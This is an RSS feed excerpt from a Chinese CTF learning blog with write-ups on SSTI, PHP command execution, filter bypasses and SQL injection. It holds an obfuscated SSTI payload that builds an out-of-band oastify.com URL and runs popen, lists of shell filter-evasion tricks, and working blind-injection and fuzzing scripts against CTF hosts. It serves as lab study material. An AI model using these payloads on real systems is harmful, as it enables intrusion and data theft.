class="n">bchr</span><span class="p">(</span><span class="mi">１１２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１００</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５４</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１００</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">５０</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０８</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１３</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９７</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０５</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０２</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１２１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">４６</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">９９</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１１１</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">１０９</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span><span class="n">ldjwi</span><span class="p">{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}</span>
</span></span></code></pre></div><p>思路一：<code>object</code>的某个派生类中存在危险方法，直接调用
思路二：<code>object</code>的某个派生类中导入了危险模块，可以链式调用危险方法
思路三：<code>object</code>的某个派生类由于导入的某些标准库模块，从而简介导入了危险模块的危险方法，可以链式调用
思路四：基本类型的某些方法属于特殊方法，可以链式调用</p>
        
        <hr><p>本文2025-07-22首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-22</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>Ctfshow_rce</title>
      <link>https://www.lier.xin/post/ctfshow_rce/</link>
      <pubDate>Tue, 22 Jul 2025 18:36:25 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/ctfshow_rce/</guid>
      <description>
        <![CDATA[<h1>Ctfshow_rce</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="命令执行">
<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c"></a>
命令执行
</h2><p>77</p>
<h3 id="命令执行函数">
<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0"></a>
命令执行函数
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system()
</span></span><span class="line"><span class="cl">passthru()
</span></span><span class="line"><span class="cl">exec()
</span></span><span class="line"><span class="cl">shell_exec()
</span></span><span class="line"><span class="cl">popen()
</span></span><span class="line"><span class="cl">pcntl_exec()
</span></span><span class="line"><span class="cl">proc_open()
</span></span><span class="line"><span class="cl">``反引号运算符
</span></span></code></pre></div><p>popen()函数用法
<img src="https://image.3001.net/images/20240316/1710591793_65f58f31a784eff8fa6d1.png" alt="wd"></p>
<p>pcntl_exec()</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pcntl_exec(&#34;/bin/ls&#34;, [&#34;-l&#34;, &#34;/tmp&#34;]); ##/bin/ls -l /tmp
</span></span></code></pre></div><p>反引号使用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php &gt; eval<span class="o">(</span><span class="s2">&#34;echo `whoami`;&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">lier
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php &gt; eval<span class="o">(</span>system<span class="o">(</span><span class="s1">&#39;cat `ls`&#39;</span><span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>ldjwi<span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lier@Lier:/tmp$ cat <span class="sb">`</span>ls<span class="sb">`</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>ldjwi<span class="o">}</span>
</span></span></code></pre></div><h3 id="常见管道符">
<a class="header-anchor" href="#%e5%b8%b8%e8%a7%81%e7%ae%a1%e9%81%93%e7%ac%a6"></a>
常见管道符
</h3><h4 id="windows和linux">
<a class="header-anchor" href="#windows%e5%92%8clinux"></a>
windows和Linux
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">command1 <span class="p">|</span> command2 <span class="c1"># 管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行</span>
</span></span><span class="line"><span class="cl">command1 <span class="o">||</span> command2 <span class="c1"># 如果1执行出错，则会执行2</span>
</span></span><span class="line"><span class="cl">command1 <span class="p">&amp;</span> command2 <span class="c1"># 先执行1，不管成功与否都会执行2</span>
</span></span><span class="line"><span class="cl">command1 <span class="o">&amp;&amp;</span> command2 <span class="c1"># 先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2</span>
</span></span></code></pre></div><h4 id="linux独有">
<a class="header-anchor" href="#linux%e7%8b%ac%e6%9c%89"></a>
Linux独有
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">command1<span class="p">;</span>command2  <span class="c1"># 先执行1再执行2，不管1成功与否都会执行2</span>
</span></span><span class="line"><span class="cl"><span class="sb">``</span>                 <span class="c1">#执行命令语句</span>
</span></span><span class="line"><span class="cl"><span class="k">$()</span>                <span class="c1">#执行命令语句</span>
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">_</span><span class="si">}</span>              <span class="c1">#上一个命令的最后一个参数,若上一次没有命令输出，则为0</span>
</span></span><span class="line"><span class="cl"><span class="k">$(())</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">$((</span>~<span class="k">$(())))</span><span class="o">=</span>-1
</span></span></code></pre></div><h3 id="bypass过滤">
<a class="header-anchor" href="#bypass%e8%bf%87%e6%bb%a4"></a>
Bypass过滤
</h3><h4 id="空格bypass">
<a class="header-anchor" href="#%e7%a9%ba%e6%a0%bcbypass"></a>
空格bypass
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$9</span>
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$IFS</span>
</span></span><span class="line"><span class="cl"><span class="nv">$IFS$9</span>
</span></span><span class="line"><span class="cl">&lt;
</span></span><span class="line"><span class="cl">&lt;&gt; 
</span></span><span class="line"><span class="cl"><span class="o">{</span>cat,flag.php<span class="o">}</span>
</span></span><span class="line"><span class="cl">%09 <span class="c1"># 制表符Tab键</span>
</span></span><span class="line"><span class="cl">%0a %0b %0c %0d %0f %0e
</span></span></code></pre></div><h4 id="flag关键字bypass">
<a class="header-anchor" href="#flag%e5%85%b3%e9%94%ae%e5%ad%97bypass"></a>
flag关键字bypass
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、反斜线
</span></span><span class="line"><span class="cl">2、引号
</span></span><span class="line"><span class="cl">3、空变量 $# $@ $n
</span></span><span class="line"><span class="cl">4、base家族
</span></span><span class="line"><span class="cl">5、hex
</span></span><span class="line"><span class="cl">6、通配符 ? *
</span></span><span class="line"><span class="cl">7、中括号 [e-g]lag.txt=flag.txt
</span></span><span class="line"><span class="cl">8、大括号 cat f{k..m}ag.txt
</span></span><span class="line"><span class="cl">9、拼接法 a=fl;b=ag;cat $a$b.txt
</span></span><span class="line"><span class="cl">10、内联执行 `` 和 $() 和 echo |base64 -d|xargs cat
</span></span><span class="line"><span class="cl">11、带外 cp mv 支持通配符
</span></span><span class="line"><span class="cl">12、参数逃逸 eval system include
</span></span></code></pre></div><p>payload:</p>
        
        <hr><p>本文2025-07-22首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-22</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>Ctfshow_php</title>
      <link>https://www.lier.xin/post/ctfshow_php/</link>
      <pubDate>Tue, 22 Jul 2025 18:31:50 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/ctfshow_php/</guid>
      <description>
        <![CDATA[<h1>Ctfshow_php</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="php特性">
<a class="header-anchor" href="#php%e7%89%b9%e6%80%a7"></a>
php特性
</h2><p>1、0e开头的字符串若全为数字，强弱都相等</p>
<p>2、数组溢出，数组的最多有<code>PHP_INT_MAX</code>个元素，添加最大索引后继续追加就会引起数组溢出，导致赋值式为false</p>
        
        <hr><p>本文2025-07-22首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-22</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>极客大挑战 2019_FinalSQL</title>
      <link>https://www.lier.xin/post/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019_finalsql/</link>
      <pubDate>Thu, 17 Jul 2025 19:05:10 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019_finalsql/</guid>
      <description>
        <![CDATA[<h1>极客大挑战 2019_FinalSQL</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p>带点过滤的sql盲注,脚本一把梭</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://79e4ba64-19bf-4394-a0d4-c3d4d8bcb203.node5.buuoj.cn:81/search.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(database())&#34;</span><span class="c1">#geek</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())&#34;</span><span class="c1">#F1naI1y,Flaaaaag</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;Flaaaaag&#39;)&#34;</span><span class="c1">#id,fl4gawsl</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(id,fl4gawsl))from(Flaaaaag)&#34;</span><span class="c1">#1NO!</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)&#34;</span><span class="c1">#id,username,password</span>
</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(id,username,password))from(F1naI1y)&#34;</span><span class="c1">#1mygodcl4y_is_really_amazing,2welcomewelcome_to_my_blog,3sitehttp://www.cl4y.top,4sitehttp://www.cl4y.top,5sitehttp://www.cl4y.top,6sitehttp://www.cl4y.top,7Sycwelcom_to_Syclover,8finallycl4y_really_need_a_grilfriend,9flagflag{5bb6ba67-d838-407c-9c1c-de45fa11a7a3}</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;1^(ascii(substr((</span><span class="si">{</span><span class="n">select</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># print(r.request.url)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># exit(0)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;ERROR！！！&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">mid</span><span class="o">==</span><span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span><span class="o">==</span><span class="mi">126</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;注入完成，结果为:</span><span class="se">\n</span><span class="s2">[::]&#34;</span><span class="p">,</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>找到一个有用的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 打开读取SQL_fuzz文件</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;SQL_fuzz.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">contents</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(contents)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 删除读取数据中的&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">contents</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># # 字符串根据空格进行分割</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># d = msg.split(&#39; &#39;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span>
</span></span><span class="line"><span class="cl"><span class="c1"># print(data_list)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 进行fuzz注入</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># GET请求</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">data_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 使用time使请求能够拥有足够的时间去响应</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.04</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 获取过滤网站响应信息</span>
</span></span><span class="line"><span class="cl">    <span class="n">reponse_txt</span> <span class="o">=</span> <span class="s2">&#34;臭弟弟&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">reponse_txt</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;该网站过滤了</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># POST请求</span>
</span></span><span class="line"><span class="cl"><span class="c1"># for d in data_list:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     payload = {</span>
</span></span><span class="line"><span class="cl"><span class="c1">#         &#34;&#34;: d</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     }</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     r = requests.post(url=url, data=payload)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     reponse_txt = &#34;臭弟弟&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     if (reponse_txt in r.text):</span>
</span></span><span class="line"><span class="cl"><span class="c1">#         print(&#34;该网站过滤了{}&#34;.format(data))</span>
</span></span></code></pre></div>
        
        <hr><p>本文2025-07-17首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-17</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>[SWPU2019]Web1</title>
      <link>https://www.lier.xin/post/swpu2019web1/</link>
      <pubDate>Thu, 17 Jul 2025 19:00:53 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/swpu2019web1/</guid>
      <description>
        <![CDATA[<h1>[SWPU2019]Web1</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p>1、存在注册界面，先注册个账号登进去</p>
<p>2、测试一下发布广告</p>
<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250717150220596.png" alt="image-20250717150220556"></p>
<p>题目环境为php，排除cookie伪造</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://43888ac8-6d3b-4f13-be9b-51df2ecf759b.node5.buuoj.cn:81/detail.php?id=1
</span></span></code></pre></div><h3 id="二次注入">
<a class="header-anchor" href="#%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5"></a>
二次注入
</h3><p>该截图配上url，进行sql注入，这里是二次注入</p>
        
        <hr><p>本文2025-07-17首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-17</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>[安洵杯 2019]easy_serialize_php</title>
      <link>https://www.lier.xin/post/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_serialize_php/</link>
      <pubDate>Sun, 13 Jul 2025 18:19:41 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_serialize_php/</guid>
      <description>
        <![CDATA[<h1>[安洵杯 2019]easy_serialize_php</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="题解">
<a class="header-anchor" href="#%e9%a2%98%e8%a7%a3"></a>
题解
</h2><p>题目</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;php5&#39;</span><span class="p">,</span><span class="s1">&#39;php4&#39;</span><span class="p">,</span><span class="s1">&#39;fl1g&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="nv">$filter_arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$function</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]){</span>
